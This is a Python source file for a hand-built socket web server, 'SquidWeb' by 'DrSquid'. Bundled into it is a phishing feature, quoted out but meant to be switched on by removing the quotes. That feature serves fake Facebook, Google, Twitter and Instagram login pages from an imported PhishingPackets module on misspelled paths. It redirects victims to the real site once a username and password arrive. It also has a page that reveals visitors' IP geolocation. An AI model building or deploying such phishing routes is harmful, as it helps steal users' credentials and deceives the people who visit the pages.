import socket, threading
try:
    import PhishingPackets
except:
    pass
try:
    import geocoder
except:
    pass
class Website:
    def logo(self):
        print("""
  _____             _     ___          __  _            __   ___  
 / ____|           (_)   | \ \        / / | |          /_ | / _ \ 
| (___   __ _ _   _ _  __| |\ \  /\  / /__| |__   __   _| || | | |
 \___ \ / _` | | | | |/ _` | \ \/  \/ / _ \ '_ \  \ \ / / || | | |
 ____) | (_| | |_| | | (_| |  \  /\  /  __/ |_) |  \ V /| || |_| |
|_____/ \__, |\__,_|_|\__,_|   \/  \/ \___|_.__/    \_/ |_(_)___/ 
           | |                                                    
           |_|                                                    
Web-Server API by DrSquid
        """)
    def __init__(self, IP, Port, external_ip=None, external_port=None):
        self.logo()
        print("[+] This project is still in development. Many problems still exist, and is not perfect.")
        self.ip = IP
        self.port = int(Port)
        self.external_ip = external_ip
        self.external_port = external_port
        if self.external_ip is None:
            self.external_ip = self.ip
        if self.external_port is None:
            self.external_port = self.port
        try:
            self.phishing_packets = PhishingPackets.Phishing_Packets(self.external_ip, self.external_port)
        except Exception as e:
            pass
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.homepage = "/home"
        self.ipban_list = []
        self.subdomains = [["/home", "index.html"]]
    def recv_GET(self, request):
        try:
            return request.split()[1]
        except:
            return "/home"
    def start_server(self):
        self.server.bind((self.ip, self.port))
        self.listen()
    def listen(self):
        print(f"[+] Server is listening on {self.ip}:{self.port}.")
        while True:
            try:
                self.server.listen()
                conn, ip = self.server.accept()
                req = conn.recv(1024).decode()
                handle = threading.Thread(target=self.handler, args=(conn, ip, req)).start()
            except Exception as e:
                print(e)
    def add_subdomain(self, subdomain_name, file_with_content):
        valid_file = False
        try:
            file = open(file_with_content,"r")
            content = file.read()
            file.close()
            if not subdomain_name.startswith("/"):
                subdomain_name = f"/{subdomain_name}"
            if self.found_conflict(subdomain_name):
                print(f"[+] Subdomain Conflict Found: {subdomain_name}\n[+] Overriding the old version, and replacing with the current.")
                for i in self.subdomains:
                    if subdomain_name == i[0]:
                        self.subdomains.remove(i)
            self.subdomains.append([subdomain_name, content])
        except:
            print(f"[+] Subdomain '{subdomain_name}' not added due to reasons:\n[+] File '{file_with_content}' does not exist in the directory! Make sure the entire directory is specified or in the same directory as the script!")
    def found_conflict(self, subdomain):
        found_conflict = False
        for i in self.subdomains:
            if subdomain == i[0]:
                found_conflict = True
        return found_conflict
    def obtain_query_str(self, subdomain):
        try:
            split_item = subdomain.split("&")
            query_strs = []
            for i in split_item:
                try:
                    query_strs.append([i.split("/?")[1].split("=")[0], i.split("/?")[1].split("=")[1]])
                except:
                    query_strs.append([i.split("=")[0], i.split("=")[1]])
        except Exception as e:
            pass
        return query_strs
    def response_to_send(self, subdomain, ip, query_str):
        code = "200 OK"
        found = False
        redirect_to_real_web = False
        webdomain = ""
        for i in self.subdomains:
            if f'/{subdomain.split("/")[1]}' == i[0]:
                found = True
                return i[1].encode(), code
        """Only use the code in quotes if you want(simply get rid of the quotes)."""
        if not found:
            '''try:
                if "username" in query_str[0][0] and "password" in query_str[1][0]:
                    redirect_to_real_web = True
            except:
                pass
            if subdomain == "/":
                code = "301 Redirect"
                return f'<meta http-equiv="refresh" content="2;url=http://{self.external_ip}:{self.external_port}/home" />'.encode(), code
            elif subdomain == "/ip":
                extratext = ""
                try:
                    extratext = f"<br>Approximate Location: {geocoder.ip(ip).latlng}"
                except:
                    pass
                return f"<title>Your IP information!</title><h1>Hey there!</h1> This is your ip: {ip}{extratext}".encode(), code
            elif subdomain == "/facebok":
                webdomain = "facebook.com"
                if not redirect_to_real_web:
                    return self.phishing_packets.Facebook_packet().encode(), code
            elif subdomain == "/gogle":
                webdomain = "google.com"
                if not redirect_to_real_web:
                    return self.phishing_packets.google_packet().encode(), code
            elif subdomain == "/twtter":
                webdomain = "twitter.com"
                if not redirect_to_real_web:
                    return self.phishing_packets.twitter_packet().encode(), code
            elif subdomain == "/instgram":
                webdomain = "instagram.com"
                if not redirect_to_real_web:
                    return self.phishing_packets.instagram_packet().encode(), code
            if redirect_to_real_web:
                return f"""<meta http-equiv="Refresh" content="0; url='https://{webdomain}/'" />""".encode(), code'''
            code = "404 Not Found"
            return "<h1>Not Found</h1> Url requested was not found on the server.".encode(), code
    def obtain_actual_ip(self, msg, ip):
        ipaddr = ""
        item = 0
        for i in msg.split():
            if 'x-forwarded-for' in i.lower():
                ipaddr = msg.split()[item + 1]
                break
            else:
                ipaddr = ip
            item += 1
        return ipaddr
    def reformat_str(self, string):
        return str(string).replace("+", " ").replace("%3C", "<").replace("%3E", ">").replace(
        "%2F", "/").replace("%22", '"').replace("%27", "'").replace("%3D", "=").replace("%2B",
        "+").replace("%3A", ":").replace("%28", "(").replace("%29", ")").replace("%2C", ","
        ).replace("%3B", ";").replace("%20", " ").replace("%3F", "?").replace("%5C", "\\"
        ).replace("%7B", "{").replace("%7D", "}").replace("%24", "$").replace("%0D", "\n"
        ).replace("%0A", "   ").replace("%40","@")
    def add_dynamic_domain(self, subdomain_name, line_to_be_dynamic, inside_params):
        pass
    def handler(self, conn, ip, msg):
        try:
            subdomain = self.recv_GET(msg)
            actual_ip = self.obtain_actual_ip(msg, ip[0])
            actual_subdomain = f'/{subdomain.split("/")[1]}'
            query_strs = self.obtain_query_str(subdomain)
            code_and_response = self.response_to_send(actual_subdomain, actual_ip, query_strs)
            code = code_and_response[1]
            conn.send(f'HTTP/1.0 {code}\n'.encode())
            conn.send('Content-Type: text/html\n'.encode())
            conn.send("\n".encode())
            conn.send(code_and_response[0])
            print(f"[+] Connection: {actual_ip} - {ip} ---> {self.ip}:{self.port}{self.reformat_str(subdomain)} - HTTP/1.0 {code}")
            conn.close()
        except:
            pass
